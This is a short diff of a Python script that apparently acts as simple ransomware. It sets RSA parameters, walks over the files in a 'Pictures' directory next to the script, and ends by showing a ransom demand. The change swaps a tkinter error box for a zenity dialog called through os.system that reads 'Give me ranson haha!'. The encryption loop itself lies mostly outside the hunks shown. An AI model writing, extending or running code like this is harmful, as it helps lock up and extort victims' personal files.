@@ -1,13 +1,8 @@
 import os
 import pickle
-import tkinter as tk
-from tkinter import messagebox
 
 filepath = os.path.dirname(os.path.realpath(__file__))
 directory = filepath + "/Pictures/"
-
-root = tk.Tk()
-root.withdraw()
 
 e = 65535
 n = 22291846172619859445381409012451
@@ -26,4 +21,4 @@ for filename in os.listdir(directory):
     else:
         continue
 
-messagebox.showerror('Error', 'Give me ransom haha')
+os.system("zenity --error --text=\"{}\" --title=\"{}\"".format("Give me ranson haha!", "Error!"))
